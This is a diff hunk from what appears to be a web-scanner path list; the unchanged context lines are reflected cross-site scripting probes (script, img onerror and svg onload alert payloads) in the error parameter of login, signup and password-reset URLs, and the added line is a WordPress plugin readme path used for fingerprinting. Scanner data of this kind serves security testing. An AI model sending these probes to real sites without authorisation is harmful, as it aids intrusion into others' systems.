@@ -313,3 +313,4 @@
 /web/login?error=<script>alert(document.domain)</script>
 /web/signup?error=<img/src=x+onerror=alert(document.domain)>
 /web/reset_password?error=<svg/onload=alert(document.domain)>
+/wp-content/plugins/qubely/readme.txt
